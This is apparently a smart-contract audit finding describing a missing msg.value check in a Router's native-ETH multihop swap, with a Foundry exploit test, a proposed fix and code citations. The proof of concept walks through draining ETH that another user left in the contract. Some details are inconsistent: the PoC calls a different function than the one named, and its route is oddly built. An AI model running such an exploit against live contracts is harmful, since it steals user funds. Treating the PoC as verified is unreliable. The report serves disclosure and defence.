## Title
Router Multihop Swap Allows Theft of Residual Native Tokens Due to Missing msg.value Validation

## Summary
The Router's `multihopSwap` function transfers native tokens from its contract balance without validating that `msg.value` matches the required amount (`totalSpecified`). This allows malicious users to underpay by exploiting residual ETH left by previous users, resulting in direct theft of user funds.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/Router.sol` - `handleLockData` function, specifically lines 189-198 (swap execution) and lines 229-230 (settlement) [1](#0-0) [2](#0-1) 

**Intended Logic:** When a user initiates a multihop swap with native tokens, they should send exactly the amount of ETH needed for the swap via `msg.value`, and the Router should transfer this ETH to the FlashAccountant to settle debts.

**Actual Logic:** The Router transfers ETH from its own balance (`address(this).balance`) without validating that the ETH belongs to the current user or that `msg.value >= totalSpecified`. This creates two attack vectors:

1. **Residual ETH accumulation**: Users can accidentally or intentionally send more ETH than `totalSpecified`, leaving excess in the Router contract
2. **Underpayment theft**: Subsequent users can send less ETH than required and successfully execute swaps by using the residual ETH from previous users

**Exploitation Path:**

1. **Victim Transaction**: User A calls `multihopSwap{value: 1.1 ETH}` for a route requiring `totalSpecified = 1 ETH`
   - Router receives 1.1 ETH
   - At line 230, Router transfers 1 ETH to ACCOUNTANT
   - 0.1 ETH remains in Router contract

2. **Attacker Transaction**: User B (attacker) calls `multihopSwap{value: 0.9 ETH}` for a route requiring `totalSpecified = 1 ETH`
   - Router receives 0.9 ETH (total balance: 0.1 + 0.9 = 1 ETH)
   - At line 230, Router attempts to transfer 1 ETH to ACCOUNTANT
   - Transfer succeeds using the combined balance (0.1 ETH stolen from User A)
   - User B paid only 0.9 ETH but received 1 ETH worth of swap execution

3. **Result**: User A lost 0.1 ETH, User B gained 0.1 ETH of free value

**Security Property Broken:** This violates the **Solvency** invariant - the protocol fails to maintain proper accounting of which ETH belongs to which user, allowing theft. It also breaks the Flash Accounting invariant by allowing debt settlement with funds that don't belong to the current locker.

## Impact Explanation

- **Affected Assets**: All native ETH sent to the Router for multihop swaps
- **Damage Severity**: 
  - Individual users can lose 100% of excess ETH they accidentally send
  - Attackers can extract all residual ETH in the Router by underpaying
  - No limit on the amount that can be stolen - accumulates across all users
- **User Impact**: Any user who sends excess ETH becomes a victim. Any subsequent user who intentionally underpays (or even accidentally underpays if residual exists) benefits from stolen funds.

## Likelihood Explanation

- **Attacker Profile**: Any user of the protocol can exploit this - no special privileges required
- **Preconditions**: 
  - Residual ETH must exist in Router (easily created by overpaying or through front-end estimation errors)
  - Attacker must monitor Router balance and submit transaction before victim calls `refundNativeToken()`
- **Execution Complexity**: Single transaction - attacker simply calls `multihopSwap` with less ETH than required while residual exists
- **Frequency**: Continuously exploitable - attacker can monitor mempool for overpayment transactions and immediately exploit, or monitor Router balance on-chain

## Recommendation

Add validation to ensure `msg.value` matches the required native token amount:

```solidity
// In src/Router.sol, function handleLockData, around line 228-230:

// CURRENT (vulnerable):
if (totalSpecified > 0) {
    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
    } else {
        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
    }
}

// FIXED:
if (totalSpecified > 0) {
    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
        // Validate that user sent at least the required ETH
        uint256 required = uint128(uint256(totalSpecified));
        if (msg.value < required) {
            revert InsufficientNativeTokenPayment(required, msg.value);
        }
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), required);
        // Refund excess ETH to the user
        if (msg.value > required) {
            SafeTransferLib.safeTransferETH(swapper, msg.value - required);
        }
    } else {
        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
    }
}
```

Alternative mitigation: Track `msg.value` at the start of `handleLockData` and validate it matches the native token requirement before settlement.

## Proof of Concept

```solidity
// File: test/Exploit_ResidualETHTheft.t.sol
// Run with: forge test --match-test test_ResidualETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";
import {Router, RouteNode, TokenAmount, Swap} from "../src/Router.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";
import {PoolKey} from "../src/types/poolKey.sol";

contract Exploit_ResidualETHTheft is FullTest {
    address victim = address(0xdead);
    address attacker = address(0xbeef);

    function setUp() public override {
        super.setUp();
        
        // Fund victim and attacker
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);
    }
    
    function test_ResidualETHTheft() public {
        // SETUP: Create ETH pool with liquidity
        PoolKey memory poolKey = createETHPool(0, 1 << 63, 100);
        createPosition(poolKey, -100, 100, 1000 ether, 1000 ether);

        // Create a 2-hop route (ETH -> token1 -> ETH)
        RouteNode[] memory route = new RouteNode[](2);
        route[0] = RouteNode(poolKey, SqrtRatio.wrap(0), 0);
        route[1] = RouteNode(poolKey, SqrtRatio.wrap(0), 0);

        // VICTIM: Overpays by 0.1 ETH (accidentally or due to front-end estimation)
        vm.startPrank(victim);
        Swap[] memory victimSwap = new Swap[](1);
        victimSwap[0] = Swap(route, TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether}));
        
        uint256 victimBalanceBefore = victim.balance;
        // Victim sends 1.1 ETH but only needs 1 ETH
        router.multiMultihopSwap{value: 1.1 ether}(victimSwap, type(int256).min);
        uint256 victimBalanceAfter = victim.balance;
        vm.stopPrank();

        // Verify 0.1 ETH remains in Router
        uint256 routerBalance = address(router).balance;
        assertEq(routerBalance, 0.1 ether, "Router should have 0.1 ETH residual");
        
        // ATTACKER: Underpays by 0.1 ETH, exploiting the residual
        vm.startPrank(attacker);
        Swap[] memory attackerSwap = new Swap[](1);
        attackerSwap[0] = Swap(route, TokenAmount({token: NATIVE_TOKEN_ADDRESS, amount: 1 ether}));
        
        uint256 attackerBalanceBefore = attacker.balance;
        // Attacker sends only 0.9 ETH but needs 1 ETH - transaction should fail but succeeds!
        router.multiMultihopSwap{value: 0.9 ether}(attackerSwap, type(int256).min);
        uint256 attackerBalanceAfter = attacker.balance;
        vm.stopPrank();

        // VERIFY: Exploit success
        uint256 attackerPaid = attackerBalanceBefore - attackerBalanceAfter;
        assertLt(attackerPaid, 1 ether, "Attacker paid less than 1 ETH");
        assertEq(address(router).balance, 0, "Router balance drained by attacker");
        
        // Attacker effectively stole 0.1 ETH from victim
        console.log("Victim overpaid by:", 0.1 ether);
        console.log("Attacker underpaid by:", 1 ether - attackerPaid);
        console.log("Victim's loss (stuck in Router):", 0.1 ether);
    }
}
```

**Notes:**
- The vulnerability exists because line 230 uses `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)))` which transfers from the Router's balance without checking the source of the ETH.
- Unlike the single swap path (lines 105-146) which has some refund logic for native tokens, the multihop path (lines 151-251) has no validation or refund mechanism for `msg.value`.
- The `refundNativeToken()` function exists in `PayableMulticallable` but relies on users manually calling it, creating a race condition where attackers can steal funds before victims can recover them.
- This is distinct from the original question about swap failures - the swaps don't fail, but they enable theft through improper accounting. [3](#0-2) [4](#0-3)

### Citations

**File:** src/Router.sol (L189-198)
```text
                        (PoolBalanceUpdate update,) = _swap(
                            0,
                            node.poolKey,
                            createSwapParameters({
                                _amount: tokenAmount.amount,
                                _isToken1: isToken1,
                                _sqrtRatioLimit: node.sqrtRatioLimit,
                                _skipAhead: node.skipAhead
                            })
                        );
```

**File:** src/Router.sol (L226-234)
```text
                if (totalSpecified < 0) {
                    ACCOUNTANT.withdraw(specifiedToken, swapper, uint128(uint256(-totalSpecified)));
                } else if (totalSpecified > 0) {
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
                    } else {
                        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
                    }
                }
```

**File:** src/Router.sol (L380-388)
```text
    function multihopSwap(Swap memory s, int256 calculatedAmountThreshold)
        external
        payable
        returns (PoolBalanceUpdate[] memory result)
    {
        result = abi.decode(
            lock(abi.encode(CALL_TYPE_MULTIHOP_SWAP, msg.sender, s, calculatedAmountThreshold)), (PoolBalanceUpdate[])
        );
    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```
